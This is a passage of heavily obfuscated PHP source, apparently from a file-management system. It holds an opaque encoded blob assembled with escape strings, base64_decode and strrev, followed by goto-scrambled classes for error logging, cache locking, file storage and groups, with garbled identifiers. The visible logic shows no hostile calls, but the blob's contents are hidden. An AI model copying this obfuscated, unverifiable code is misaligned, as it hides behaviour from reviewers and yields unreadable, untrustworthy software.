202\204\113\20\370\62\313\252\16"."\107\211\10\114\235\125\223\32\204\153\134\353\205\72\333\51\171\244\44\253\371\205\144\124\12\140\153\106\113\165\300\137\350\251\12\371\37\22\222\361\165\224\253\133\141".base64_decode('hrq5pZot3Klw/R5D+Mb5f1QQfvIW/eNKa7klMp2aEa9h38Tl+bMp/qVcnh1+')."\xbd\xb3\x10\x18\x70\x41\x5\xa8\x69\xbb\xd2\xcd\xaf\x66\x39\x9b\x17\x8f\xd7\x2a\xdd\x5\xb2\xb2\x6f\xf7\x32\x28\x80\xb0\xac\x88\x79\x11\xbc\xe4\x71\xcf\x33\x6a\x8f\x78\xd8\x90\x7c".strrev('Ş/¤Èû€–nâTªâï}ÁÏ—~²¤1ïİï½ÄĞ^Ğ¨î^‹Ü¡óİùí')."\xa4\xd5\xd9\x1f\xcb\x16\xe0\x9f\xc1\xe9\x40\x2f\xb6\xec\x16\x68\x8e\xbb\x1c\x78\xd5\x12\xce\x65\xae\x71\x92\x29\x7e\x51\xce\x7a\xe9\x2e\x8a\x83\x96\x5\xf7\xb\xd5\x89\x17\xf2\xfd"."\26\10\25\156\204\143\245\165\212\5\107\211\355\370\263\123\26\262\310\63\23\176\327\122\263\205\150\262\301\222\234\101\61\321\322\305\334\345\106\154\72\307\125\14\114".base64_decode('ovsJnOayJuH8as6IxAK5o8UljLw5I2UKN53bAJ2yXMMXXoko1ORa5YT1AmVw')."\217\12\26\303\111\260\44\147\251\54\145\105\31\226\27\203\337\237\62\373\351\141\376\370\321\356\310\31\75\351\63\167\74\45\144\355\157\112\12\146\316\157\216\254\177"."\156\156\44\172\26\356\105\101\31\272\277\136\24\314\334\157\57\54\37\203\24\55\153\12\221\71\232\122\200\260\161\103\230\174\22\312\323\12\230\345\20\47\144\340\24"."\15\132\136\62\344\45\213\66\76\205\255\200\202\5\67\242\151\65\317\311\201\213\23\103\55\105\167\234\177\336\227\233\256\360\65\111\64\40\202\55\204\67\233\352\112"."\321\217\123\203\26\270\23\11\326\12\345\306\162\274\320\120\214\114\145\5\47\47\320\240\22\207\220\326\17\176\137\73\46\130\363\101\240\350\160\6\247\133\214\151\64"."\370\371\27\146\357\142\61\356\50\220\356\340\372\76\321\57\220\305\105\21\314\302\257\271\361\271\111\24\243\370\176\31\131\311\22\110\115\37\224\26\154\370\70\302\311".base64_decode('Id3I2GBaWE+j3xo9k2F+1bkkB3hLVAixU/B4sQlGPiDEP3wHsQmpZxFaoe2P')."\202\344\322\33\62\370\41\25\247\42\222\142\211\100\265\57\213\210\247\107\227\36\217\352\275\144\165\220\233\74\336\32\27\253\224\134\206\210\173\241\43\30\41\32\44"."\x21\xf3\x55\xd3\x89\x53\x9c\xe4\x99\x99\x1d\xd5\x61\x27\x6e\x95\xb9\x6d\x37\x2e\x8e\xbf\x68\xc7\xfc\x8c\xfc\x51\xd\x44\x4b\xc5\xab\xc0\x1f\xa0\x40\x4e\xec\xe0\x77\x5b\xbc\x73\x7c".base64_decode('oXAoL6nJFQq1BIIe/CIlLxmVEqy/8pKa6gON/aV5G1w+f14atAaD72Sob2+c')."\344\153\102\275\164\371\375\324\150\74\277\27\76\367\114\336\23\144\127\300\305\267\164\247\316\124\173\320\114\252\221\310\252\301\164\206\243\261\140\26\111\325\262\41\205".strrev('DËŒÚÛ®üâò(¢<N>~°y©0DE…•b5äKEI«Pé}™äƒõ>')."\215\77\361\147\215\204\104\174\220\133\254\60\4\70\332\56\120\33\146\23\20\65\267\23\16\362\34\45\347\152\41\377\273\361\226\10\17\11\326\262\71\13\323\257\272"."\330\142\34\41\234\366\375\330\133\360\311\206\263\63\103\47\166\214\13\365\250\240\27\305\362\210\107\174\301\51\132\374\341\260\45\31\271\237\143\324\54\254\207\225\16".base64_decode('Qr0gh8FjNX1iWNS1TGMUC9EvTLJyzb4EyyK4FP8P/APq7VSVAAA=').""."", 10, -8))); goto cƒñ—Ô…Š; dÅÅÔÉœƒ”: function beforeShutdownError($F†Çß‘†Œİ = false, $eÒ‡„ó„İõ = '', $d¶ó–Ç†ë‡ = '', $cœÍªÙ—í» = 0) { $Bá†¢¼ëÑ³ =& $_SERVER[•¡£]; switch ($F†Çß‘†Œİ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $CÆ°ÃÌÌ· = $Bá†¢¼ëÑ³[22]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $CÆ°ÃÌÌ· = $Bá†¢¼ëÑ³[23]; break; case E_STRICT: $CÆ°ÃÌÌ· = $Bá†¢¼ëÑ³[24]; break; case E_NOTICE: case E_USER_NOTICE: $CÆ°ÃÌÌ· = $Bá†¢¼ëÑ³[25]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $CÆ°ÃÌÌ· = $Bá†¢¼ëÑ³[26]; break; default: break; } if (!$CÆ°ÃÌÌ· || $CÆ°ÃÌÌ· == $Bá†¢¼ëÑ³[25] || $CÆ°ÃÌÌ· == $Bá†¢¼ëÑ³[26]) { return; } $d¶ó–Ç†ë‡ = $Bá†¢¼ëÑ³[2] . str_replace(BASIC_PATH, $Bá†¢¼ëÑ³[27], $d¶ó–Ç†ë‡); $d˜•‹ÃĞ‘‚ = $CÆ°ÃÌÌ· . $Bá†¢¼ëÑ³[28] . $eÒ‡„ó„İõ . $Bá†¢¼ëÑ³[28] . $d¶ó–Ç†ë‡ . $Bá†¢¼ëÑ³[28] . $cœÍªÙ—í»; write_log($d˜•‹ÃĞ‘‚ . $Bá†¢¼ëÑ³[18] . get_caller_msg(), $Bá†¢¼ëÑ³[19]); } function beforeShutdownFatalError($CÕÈÀ…èíº) { think_exception($CÕÈÀ…èíº); } $aàËøï¦¢à = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto dğÎ¡Ü”Œ; Dßœ„°ïŞŒ: class CacheLockRedis { public function lock($eë“÷Îïä, $cæÍèÏ£¹¿ = 10) { $aÂ¿‰ò“œÔ = Cache::init(); $FÓ¬Ø¹³î² = microtime(!0) + $cæÍèÏ£¹¿; while (microtime(!0) < $FÓ¬Ø¹³î²) { $aÎÂ”¹”éë = $aÂ¿‰ò“œÔ->get($eë“÷Îïä); if (!$aÎÂ”¹”éë) { $d‘¾­£»¾ = $aÂ¿‰ò“œÔ->setLock($eë“÷Îïä, $FÓ¬Ø¹³î², $cæÍèÏ£¹¿); if ($d‘¾­£»¾) { return !0; } } else { if ($aÎÂ”¹”éë < microtime(!0)) { $aÂ¿‰ò“œÔ->set($eë“÷Îïä, $FÓ¬Ø¹³î², $FÓ¬Ø¹³î²); if ($aÂ¿‰ò“œÔ->get($eë“÷Îïä) === $aÎÂ”¹”éë) { return !0; } } } cacheLockWait(); } return !1; } public function unlock($dˆ—‰å¦¼) { $A‹ÖĞÂæ = Cache::init(); $A‹ÖĞÂæ->remove($dˆ—‰å¦¼); } } class CacheLockMemcached { public function lock($dø’ìµ‡Ü”, $F„Æá°Ûå¦ = 0) { $cÕØÖ†‡äŸ = Cache::init(); $F¥øî„ñæˆ = microtime(!0) + $F„Æá°Ûå¦; while (microtime(!0) < $F¥øî„ñæˆ) { $Cçä¸êÆ¶— = $cÕØÖ†‡äŸ->get($dø’ìµ‡Ü”); if (!$Cçä¸êÆ¶— || $Cçä¸êÆ¶— < microtime(!0)) { $eÄ®™ã†ÖÁ = $cÕØÖ†‡äŸ->handle->add($dø’ìµ‡Ü”, $F¥øî„ñæˆ, $F„Æá°Ûå¦); if ($eÄ®™ã†ÖÁ) { return !0; } } cacheLockWait(); } return !1; } public function unlock($b¶ËğºËº”) { $bï¡…ÆÆğ = Cache::init(); $bï¡…ÆÆğ->remove($b¶ËğºËº”); } } class CacheLockDatabase { public function lock($Aç‰Ñªğõã, $d½Ğ¤á†Ê = 0) { $cì†„Òä¨º = Model($_SERVER[İåâé¾][524]); $dâçÙìäÉº = microtime(!0) + $d½Ğ¤á†Ê; while (microtime(!0) < $dâçÙìäÉº) { $D´ ê»À‡ë = $cì†„Òä¨º->get($Aç‰Ñªğõã); if (!$D´ ê»À‡ë || $D´ ê»À‡ë < microtime(!0)) { $DÅœ–É = $cì†„Òä¨º->set($Aç‰Ñªğõã, $dâçÙìäÉº); if ($DÅœ–É) { return !0; } } cacheLockWait(); } return !1; } public function unlock($BÄ’§ªìì…) { Model($_SERVER[İåâé¾][524])->remove($BÄ’§ªìì…); } } goto B‡¾è«ò’­; CğÓéŒßÉ: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\154\x65"; public function fileInfo($eØÓ¾ÆºÕŠ) { $bİº½Ğ¶² =& $_SERVER[İåâé¾]; static $A±á †œªæ = array(); if (!isset($A±á †œªæ[$eØÓ¾ÆºÕŠ])) { $c¯ª¢ä× ò = $bİº½Ğ¶²[1590]; $CÁìŠèğ´Ó = Model($bİº½Ğ¶²[411])->field($c¯ª¢ä× ò)->where(array($bİº½Ğ¶²[390] => $eØÓ¾ÆºÕŠ))->find(); $A±á †œªæ[$eØÓ¾ÆºÕŠ] = $CÁìŠèğ´Ó; } return $A±á †œªæ[$eØÓ¾ÆºÕŠ]; } public function addFileByContent($EîÊ£“êŒ± = '', $B‚Š–¢¤İí = '') { goto D¦Şôò˜; D¦Şôò˜: $AÖŒˆí•Ê… =& $_SERVER[İåâé¾]; $bÔ£ÏŞÆà¢ = TEMP_PATH . $AÖŒˆí•Ê…[1591]; if (!is_dir($bÔ£ÏŞÆà¢)) { mk_dir($bÔ£ÏŞÆà¢); } goto D˜±‹ò˜»; d„¦ïÍë™¼: if (file_exists($a«‰â”ô‡)) { @unlink($a«‰â”ô‡); } return $d­ŠÙÉ™Ë; goto døé™™¬ Õ; D˜±‹ò˜»: $a«‰â”ô‡ = $bÔ£ÏŞÆà¢ . $AÖŒˆí•Ê…[1592] . rand_string(16); file_put_contents($a«‰â”ô‡, $EîÊ£“êŒ±); $d­ŠÙÉ™Ë = $this->addFile($a«‰â”ô‡, $B‚Š–¢¤İí, !0); goto d„¦ïÍë™¼; døé™™¬ Õ: } public function createFileName($B‘™‹‚‘Ú‰) { goto dªñª¼˜Ã¡; b–ßÉ£ÚÎ·: if (!$e…Œ’îÄ¸â && !Cache::get($F´‘çœå¨º)) { $e…Œ’îÄ¸â = !0; $fˆÑŠìİ = IO::mkdir($B§à———ß…); if (!IO::exist($fˆÑŠìİ . $A·æÄ¹¦¦œ[1594])) { IO::mkfile($fˆÑŠìİ . $A·æÄ¹¦¦œ[1594]); } Cache::set($F´‘çœå¨º, 1, 3600 * 2); } return $Eƒ˜¿æ¹™; goto Dóø»²ñ£; d–¸®‹ãïÙ: $B§à———ß… = $A¨¼™ìàİ«->pathFather($Eƒ˜¿æ¹™); static $e…Œ’îÄ¸â = false; $F´‘çœå¨º = $A·æÄ¹¦¦œ[1593] . md5($B§à———ß…); goto b–ßÉ£ÚÎ·; dªñª¼˜Ã¡: $A·æÄ¹¦¦œ =& $_SERVER[İåâé¾]; $A¨¼™ìàİ« = IO::init($A·æÄ¹¦¦œ[8]); $Eƒ˜¿æ¹™ = $this->makeFilePath($B‘™‹‚‘Ú‰, $A¨¼™ìàİ«); goto d–¸®‹ãïÙ; Dóø»²ñ£: } public function makeFilePath($F‚¨Ìá—Êğ, $a¶òÂâ¿öÈ) { goto Dî¢ „È; Dî¢ „È: $bµÜ“á™‘á =& $_SERVER[İåâé¾]; $CÜÑ‡·‹Ó = Model($bµÜ“á™‘á[830])->get($bµÜ“á™‘á[1595]); $cï£†à¦¾ = KodIO::defaultIO() . date($bµÜ“á™‘á[1596]); goto föÀÀ—§µ‡; c¦¿ëƒ“ñÉ: switch ($CÜÑ‡·‹Ó) { case $bµÜ“á™‘á[1598]: $DÌ–‰õÌ×Ü = $DÌ–‰õÌ×Ü . $bµÜ“á™‘á[90] . $a¶òÂâ¿öÈ->ext($F‚¨Ìá—Êğ); if ($a¶òÂâ¿öÈ->ext($F‚¨Ìá—Êğ) == $bµÜ“á™‘á[1532]) { $DÌ–‰õÌ×Ü .= $bµÜ“á™‘á[1599]; } break; case $bµÜ“á™‘á[1600]: goto d¶Õ®“Œß«; d¶Õ®“Œß«: $D‘ÙöŠ°ìÓ = Model($bµÜ“á™‘á[830])->get($bµÜ“á™‘á[1601]); $Cß¶†­·áÖ = substr(md5($bµÜ“á™‘á[1306] . $D‘ÙöŠ°ìÓ . date($bµÜ“á™‘á[444])), 0, 8); $cï£†à¦¾ = KodIO::defaultIO() . date($bµÜ“á™‘á[1602]) . $Cß¶†­·áÖ . $bµÜ“á™‘á[8]; goto C—î­ò’Ñ; C—î­ò’Ñ: if ($a¶òÂâ¿öÈ->ext($F‚¨Ìá—Êğ) == $bµÜ“á™‘á[1532]) { $F‚¨Ìá—Êğ .= $bµÜ“á™‘á[1599]; } $D‡¯Ûíçõ = IO::fileNameAuto($cï£†à¦¾, $F‚¨Ìá—Êğ); $DÌ–‰õÌ×Ü = $cï£†à¦¾ . $D‡¯Ûíçõ; goto Eôİ†¾Ç´’; Eôİ†¾Ç´’: break; goto dßòš’¢¿¥; dßòš’¢¿¥: case $bµÜ“á™‘á[1597]: break; default: break; } return $DÌ–‰õÌ×Ü; goto eêëº¨…Õ¹; föÀÀ—§µ‡: $DÌ–‰õÌ×Ü = $cï£†à¦¾ . rand_string(5) . short_id(100); $F‚¨Ìá—Êğ = str_replace($bµÜ“á™‘á[8], $bµÜ“á™‘á[71], KodIO::clear($F‚¨Ìá—Êğ)); if (!$F‚¨Ìá—Êğ) { $CÜÑ‡·‹Ó = $bµÜ“á™‘á[1597]; } goto c¦¿ëƒ“ñÉ; eêëº¨…Õ¹: } public function addFileByRemote($cÎÒ‹Ù˜ÎÉ, $bøïó”ÍË, $d³“†¬Š±Ñ = array()) { goto c¹š¶º; d§© Œåëë: if ($B¦š¼ò‘Ò´ = $this->addFileCheckExist($A²ë´¥Ç¥°[$fšŞÔ ¢·[160]], $A²ë´¥Ç¥°[$fšŞÔ ¢·[159]], $A²ë´¥Ç¥°[$fšŞÔ ¢·[78]])) { return $B¦š¼ò‘Ò´; } $eĞ˜Õ‰ÅÑÌ = $this->add($A²ë´¥Ç¥°); return $this->find($eĞ˜Õ‰ÅÑÌ); goto D„’á‚ŞÛ¯; c¹š¶º: $fšŞÔ ¢· =& $_SERVER[İåâé¾]; if (!IO::exist($cÎÒ‹Ù˜ÎÉ)) { return !1; } $b‡š§‘ù§Í = $d³“†¬Š±Ñ[$fšŞÔ ¢·[159]] ? $d³“†¬Š±Ñ[$fšŞÔ ¢·[159]] : $fšŞÔ ¢·[33]; goto Eè“¥ÃÆ¦œ; Eè“¥ÃÆ¦œ: $C†¿ùø¯À… = IO::hashMd5($cÎÒ‹Ù˜ÎÉ, $b‡š§‘ù§Í); $fŞª—èàÏ = KodIO::defaultDriver(); $A²ë´¥Ç¥° = array($fšŞÔ ¢·[391] => IO::size($cÎÒ‹Ù˜ÎÉ), $fšŞÔ ¢·[1603] => 1, $fšŞÔ ¢·[387] => $bøïó”ÍË, $fšŞÔ ¢·[504] => $fŞª—èàÏ[$fšŞÔ ¢·[368]], $fšŞÔ ¢·[1604] => $cÎÒ‹Ù˜ÎÉ, $fšŞÔ ¢·[1605] => $d³“†¬Š±Ñ[$fšŞÔ ¢·[160]] ? $d³“†¬Š±Ñ[$fšŞÔ ¢·[160]] : IO::hashSimple($cÎÒ‹Ù˜ÎÉ), $fšŞÔ ¢·[1606] => $C†¿ùø¯À… ? $C†¿ùø¯À… : $b‡š§‘ù§Í); goto d§© Œåëë; D„’á‚ŞÛ¯: } public function addFile($cÁ„ä¯”, $Cë¦³«Ô°ï, $B÷¤‰± = false) { goto FçÇ¿¼Òµ¸; aì®²»äš: if ($CÁíèËØ‹ = $this->addFileCheckExist($bÚ¬‹åŒŸ, $eƒ“Á‘¯Äå, $D®“‡¤˜ß)) { return $CÁíèËØ‹; } $C‘­ÂÌÄÙ = $this->addFileMake($cÁ„ä¯”, $D®“‡¤˜ß, $bÚ¬‹åŒŸ, $eƒ“Á‘¯Äå, $Cë¦³«Ô°ï, $B÷¤‰±); $bê¸·ÕÙªÉ = $this->add($C‘­ÂÌÄÙ); goto e¸‚¶Õµíâ; FçÇ¿¼Òµ¸: $bÚ¬‹åŒŸ = IO::hashSimple($cÁ„ä¯”); $eƒ“Á‘¯Äå = IO::hashMd5($cÁ„ä¯”); $D®“‡¤˜ß = IO::size($cÁ„ä¯”); goto aì®²»äš; e¸‚¶Õµíâ: $CÁíèËØ‹ = $this->find($bê¸·ÕÙªÉ); return $CÁíèËØ‹; goto Cëôå§¿ƒ; Cëôå§¿ƒ: } public function addFileMake($a Ñ—ªóö, $B¦¥Ó¾Äæã, $DƒÎÈ†¹³, $eÊì±…éŠ, $A¨ŸÜÂÑ³Æ, $c”µÑÀÄÑ×) { $dæ°ßˆÎì‰ =& $_SERVER[İåâé¾]; $DàÕóÒ‡Ô = $this->createFileName($A¨ŸÜÂÑ³Æ); if ($c”µÑÀÄÑ×) { IO::move($a Ñ—ªóö, $DàÕóÒ‡Ô); } else { IO::copy($a Ñ—ªóö, $DàÕóÒ‡Ô); } $Cá·ºÎÙ‡Ù = KodIO::defaultDriver(); $c”İÙªÎƒ = array($dæ°ßˆÎì‰[391] => $B¦¥Ó¾Äæã, $dæ°ßˆÎì‰[1603] => 1, $dæ°ßˆÎì‰[387] => $A¨ŸÜÂÑ³Æ, $dæ°ßˆÎì‰[504] => $Cá·ºÎÙ‡Ù[$dæ°ßˆÎì‰[368]], $dæ°ßˆÎì‰[1604] => $DàÕóÒ‡Ô, $dæ°ßˆÎì‰[1605] => $DƒÎÈ†¹³, $dæ°ßˆÎì‰[1606] => $eÊì±…éŠ); return $c”İÙªÎƒ; } public function addFileCheckExist($bÂø¶®ƒÑ, $Aò…ºÏ‰í…, $cÉÏâƒàß) { $e‡óºù•Ğ =& $_SERVER[İåâé¾]; $Aí’–Àí§¼ = $this->findByHash($bÂø¶®ƒÑ, $Aò…ºÏ‰í…); if (!$Aí’–Àí§¼) { return !1; } $bø‘†œÚ¹¶ = array($e‡óºù•Ğ[1603] => intval($Aí’–Àí§¼[$e‡óºù•Ğ[1607]]) + 1, $e‡óºù•Ğ[391] => $cÉÏâƒàß); $this->where(array($e‡óºù•Ğ[390] => $Aí’–Àí§¼[$e‡óºù•Ğ[382]]))->save($bø‘†œÚ¹¶); return $Aí’–Àí§¼; } public function remove($dÚÕàÊÓâ) { $this->linkCountChange($dÚÕàÊÓâ, !1); $this->clearEmpty(); return !0; } public function linkAdd($F…õ›‚Öö) { $this->linkCountChange($F…õ›‚Öö, !0); } public function linkCountChange($d­Ô£‰¢¨ª, $F¨İ¿ğ¶˜) { goto EƒŒ®¡Àˆğ; EƒŒ®¡Àˆğ: $BÒÔ¾Á¦“ =& $_SERVER[İåâé¾]; if (!$d­Ô£‰¢¨ª) { return; } if (!is_array($d­Ô£‰¢¨ª)) { $d­Ô£‰¢¨ª = array($d­Ô£‰¢¨ª); } goto d¨²¢ƒù¨ï; d¨²¢ƒù¨ï: $AÒÈŸ©ˆÒ = array(); foreach ($d­Ô£‰¢¨ª as $D÷“å™İ²ç) { $f¸Ã‘¹ ñè = $D÷“å™İ²ç . $BÒÔ¾Á¦“[33]; if (!$AÒÈŸ©ˆÒ[$f¸Ã‘¹ ñè]) { $AÒÈŸ©ˆÒ[$f¸Ã‘¹ ñè] = 0; } $AÒÈŸ©ˆÒ[$f¸Ã‘¹ ñè]++; } $BÓöˆ‡â‰ = array(); goto F—¹Á¤¸É; F—¹Á¤¸É: foreach ($AÒÈŸ©ˆÒ as $D÷“å™İ²ç => $bø¼™ÏÓÚ‡) { $f¸Ã‘¹ ñè = $bø¼™ÏÓÚ‡ . $BÒÔ¾Á¦“[33]; if (!$BÓöˆ‡â‰[$f¸Ã‘¹ ñè]) { $BÓöˆ‡â‰[$f¸Ã‘¹ ñè] = array(); } $BÓöˆ‡â‰[$f¸Ã‘¹ ñè][] = $D÷“å™İ²ç; } foreach ($BÓöˆ‡â‰ as $bø¼™ÏÓÚ‡ => $eÕƒ¢àæÓ·) { if (!$eÕƒ¢àæÓ·) { continue; } $bø¼™ÏÓÚ‡ = $F¨İ¿ğ¶˜ ? $bø¼™ÏÓÚ‡ : -intval($bø¼™ÏÓÚ‡); $f¤êĞ°ë§¡ = array($BÒÔ¾Á¦“[382] => array($BÒÔ¾Á¦“[7], $eÕƒ¢àæÓ·)); if ($bø¼™ÏÓÚ‡ < 0) { $f¤êĞ°ë§¡[$BÒÔ¾Á¦“[1607]] = array($BÒÔ¾Á¦“[695], abs($bø¼™ÏÓÚ‡)); } $this->where($f¤êĞ°ë§¡)->setAdd($BÒÔ¾Á¦“[1607], $bø¼™ÏÓÚ‡); } goto EŸ÷Éù×¦Í; EŸ÷Éù×¦Í: } public function findByHash($C©ö‘Ç¿÷º, $DÌã‡ãÉŠª = false) { $dŒ•Â„»´Ş =& $_SERVER[İåâé¾]; $B’ºÎÕùÉ = array($dŒ•Â„»´Ş[1605] => $C©ö‘Ç¿÷º); if ($DÌã‡ãÉŠª) { $B’ºÎÕùÉ = array($dŒ•Â„»´Ş[1606] => $DÌã‡ãÉŠª); } return $this->order($dŒ•Â„»´Ş[1608])->where($B’ºÎÕùÉ)->find(); } public function clearEmpty($Eà‘æ‘‚‘ó = 0) { goto B¥¡‰¨Ùƒ; B¥¡‰¨Ùƒ: $C‚é‹÷ ‚Ğ =& $_SERVER[İåâé¾]; $AéÀíÓá§ö = time() - 3600 * 24 * $Eà‘æ‘‚‘ó; $AÁ ƒÈ °ì = $C‚é‹÷ ‚Ğ[1609] . $AéÀíÓá§ö; goto E ·Üã¾¼; E ·Üã¾¼: $d·¨¦¹Ï¾Í = $this->where($AÁ ƒÈ °ì)->select(); if (!$d·¨¦¹Ï¾Í) { return; } $bÇ÷¾ù‘Ë = new Task($C‚é‹÷ ‚Ğ[1610], $C‚é‹÷ ‚Ğ[33], count($d·¨¦¹Ï¾Í)); goto Dß±Ï…÷ÚÉ; Dß±Ï…÷ÚÉ: foreach ($d·¨¦¹Ï¾Í as $cŒ ‡„êŒà) { $bÇ÷¾ù‘Ë->update(1); $this->resetFile($cŒ ‡„êŒà); } $bÇ÷¾ù‘Ë->end(); goto D„À‚¤Å›Ú; D„À‚¤Å›Ú: } public function refreshData() { goto e¸ßœàõµ; e³ŒÔâáåì: if (!$dÄ¨›ƒ¥³ª) { return; } $d¡³”ÄïØË = new Task($B‚‰å‚Æ‹î[1611], $B‚‰å‚Æ‹î[33], count($dÄ¨›ƒ¥³ª)); foreach ($dÄ¨›ƒ¥³ª as $f¢‹˜†Â¨î) { $d¡³”ÄïØË->update(1); if ($this->removeNotExist($f¢‹˜†Â¨î)) { continue; } $this->resetFile($f¢‹˜†Â¨î); } goto BÏ›ã Ÿ®; BÏ›ã Ÿ®: $d¡³”ÄïØË->end(); $this->clearEmpty(); goto FÌà£¤Æä; e¸ßœàõµ: $B‚‰å‚Æ‹î =& $_SERVER[İåâé¾]; $this->refreshSourceHistory(); $dÄ¨›ƒ¥³ª = $this->select(); goto e³ŒÔâáåì; FÌà£¤Æä: } private function resetFile($bŒ…ÉÈ…) { goto E˜™°†ŒƒŠ; EÖ©÷è‡åÍ: $bÒªØ×©™ = Model($cë½Ÿ¸‘[1612])->where($Bå®¿©¾¿é)->count(); $eâßÃÌ—º¶ = intval($DÅ“®ñøŠ) + intval($bÒªØ×©™); if ($eâßÃÌ—º¶ == 0) { IO::remove($bŒ…ÉÈ…[$cë½Ÿ¸‘[76]]); $this->where($Bå®¿©¾¿é)->delete(); return; } goto e²©÷¯ÃÁå; E˜™°†ŒƒŠ: $cë½Ÿ¸‘ =& $_SERVER[İåâé¾]; $Bå®¿©¾¿é = array($cë½Ÿ¸‘[390] => $bŒ…ÉÈ…[$cë½Ÿ¸‘[382]]); $DÅ“®ñøŠ = Model($cë½Ÿ¸‘[850])->where($Bå®¿©¾¿é)->count(); goto EÖ©÷è‡åÍ; e²©÷¯ÃÁå: if ($bŒ…ÉÈ…[$cë½Ÿ¸‘[1607]] != $eâßÃÌ—º¶) { $this->where($Bå®¿©¾¿é)->save(array($cë½Ÿ¸‘[1603] => $eâßÃÌ—º¶)); } goto FÀ†ŒãÎ¦; FÀ†ŒãÎ¦: } private function removeNotExist($e¯‚ÌËŠˆ÷) { goto a Şï¹öÕÙ; fÖòÛŸ¡Š½: $c‰äÕšˆİ• = array($A¢¬¼„ê[390] => $e¯‚ÌËŠˆ÷[$A¢¬¼„ê[382]]); Model($A¢¬¼„ê[850])->where($c‰äÕšˆİ•)->delete(); Model($A¢¬¼„ê[1612])->where($c‰äÕšˆİ•)->delete(); goto cÄªŒìÊ; a Şï¹öÕÙ: $A¢¬¼„ê =& $_SERVER[İåâé¾]; if (IO::exist($e¯‚ÌËŠˆ÷[$A¢¬¼„ê[76]])) { return !1; } $this->remove($e¯‚ÌËŠˆ÷[$A¢¬¼„ê[382]]); goto fÖòÛŸ¡Š½; cÄªŒìÊ: return !0; goto fá‰Ê­®ã; fá‰Ê­®ã: } private function refreshSourceHistory() { $D‘õ–ê¨Ñ =& $_SERVER[İåâé¾]; $e’ †Ù‡î = Model($D‘õ–ê¨Ñ[1613])->select(); if (!$e’ †Ù‡î) { return; } foreach ($e’ †Ù‡î as $A±ß·ëÒÓ–) { $côŠ°œ¾ó§ = array($D‘õ–ê¨Ñ[415] => $A±ß·ëÒÓ–[$D‘õ–ê¨Ñ[374]]); if (!Model($D‘õ–ê¨Ñ[850])->where($côŠ°œ¾ó§)->find()) { Model($D‘õ–ê¨Ñ[1613])->where($côŠ°œ¾ó§)->delete(); } } } public function storageInfo($D¾Éœ±Â¡ = false) { goto E‹¥­­ÉŒ; dÎÏ·ÃÇŞ: for ($C½Ò…éç›… = 0; $C½Ò…éç›… < $e˜Ì‹…¢ğ§; $C½Ò…éç›… = $C½Ò…éç›… + $eÙãÇ©‡÷ø) { $Bù“‡ÅØ¼İ = $this->limit($C½Ò…éç›…, $C½Ò…éç›… + $eÙãÇ©‡÷ø)->select(); foreach ($Bù“‡ÅØ¼İ as $f¤¸‡Ì‘Ğ») { $CùóïòäÄà += $f¤¸‡Ì‘Ğ»[$féÅœ½ª¾‚[78]] * $f¤¸‡Ì‘Ğ»[$féÅœ½ª¾‚[1607]]; $B¤½Ò‹¢ += $f¤¸‡Ì‘Ğ»[$féÅœ½ª¾‚[78]] * ($f¤¸‡Ì‘Ğ»[$féÅœ½ª¾‚[1607]] - 1); $fŒ”ÜŠùŸ += $f¤¸‡Ì‘Ğ»[$féÅœ½ª¾‚[1607]]; } } $B„š£ªŠ„µ = array($féÅœ½ª¾‚[1614] => $CùóïòäÄà, $féÅœ½ª¾‚[1615] => $B¤½Ò‹¢, $féÅœ½ª¾‚[1616] => $B¤½Ò‹¢ / $CùóïòäÄà, $féÅœ½ª¾‚[82] => $e˜Ì‹…¢ğ§, $féÅœ½ª¾‚[1617] => $fŒ”ÜŠùŸ); return $B„š£ªŠ„µ; goto BÂÎÂÒÏ¹”; E‹¥­­ÉŒ: $féÅœ½ª¾‚ =& $_SERVER[İåâé¾]; $e˜Ì‹…¢ğ§ = $this->count() + 0.0; $B¤½Ò‹¢ = 0; goto DğÍ¡×Ú˜ô; DğÍ¡×Ú˜ô: $CùóïòäÄà = 1; $fŒ”ÜŠùŸ = 0; $eÙãÇ©‡÷ø = 5000; goto dÎÏ·ÃÇŞ; BÂÎÂÒÏ¹”: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\160"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\x6d\145" => "\147\162\x6f\165\160\x5f\x6d\x65\x74\141", "\155\145\164\x61\x46\x69\x65\154\x64" => "\147\162\157\x75\x70\x49\104"); protected function cacheFunctionAlias($AÁ¸•í½É) { $d‚åÑÚî¥È =& $_SERVER[İåâé¾]; return array($d‚åÑÚî¥È[1618] => array($AÁ¸•í½É[0], $d‚åÑÚî¥È[1619]), $d‚åÑÚî¥È[1620] => array($AÁ¸•í½É[0], $d‚åÑÚî¥È[1619])); } protected function getInfo($EòöåÊ‡×) { $a–ÈÅáòÌî = $this->getInfoSimple($EòöåÊ‡×); if (!$a–ÈÅáòÌî) { return !1; } return $this->_listDataApplyItem($a–ÈÅáòÌî); } protected function getInfoSimple($c·ØÚÆ†Ğ, $Eô”ß¿Î… = false) { $b¶ÜÎ¤ùŒ =& $_SERVER[İåâé¾]; if ($Eô”ß¿Î…) { $D¤Š²ƒÆ‰® = array($b¶ÜÎ¤ùŒ[1542] => intval($c·ØÚÆ†Ğ)); return $this->where($D¤Š²ƒÆ‰®)->find(); } return $this->cacheFunctionGet($b¶ÜÎ¤ùŒ[1621], $c·ØÚÆ†Ğ); } protected function groupAdd($bô¯¤®‘É†) { goto B”“¨í“; A•÷¶£Š„ã: return $b»õ¯ÍäêÛ; goto Bª‰œó«ªÃ; aíƒÙ°ñ‘¼: $b»õ¯ÍäêÛ = $this->add($b³Í‹Òš¤´); $this->setNamePinyin($b»õ¯ÍäêÛ, $b³Í‹Òš¤´[$b¨»†¥¸‡[28]]); Model($b¨»†¥¸‡[850])->groupRootAdd($b»õ¯ÍäêÛ); goto A•÷¶£Š„ã; B”“¨í“: $b¨»†¥¸‡ =& $_SERVER[İåâé¾]; if (!$bô¯¤®‘É†[$b¨»†¥¸‡[384]] && isset($bô¯¤®‘É†[$b¨»†¥¸‡[1542]]) && $bô¯¤®‘É†[$b¨»†¥¸‡[1542]] == 1) { if ($D˜Ğ–œ»·à = $this->getInfoSimple($bô¯¤®‘É†[$b¨»†¥¸‡[1542]], !0)) { return $bô¯¤®‘É†[$b¨»†¥¸‡[1542]]; } 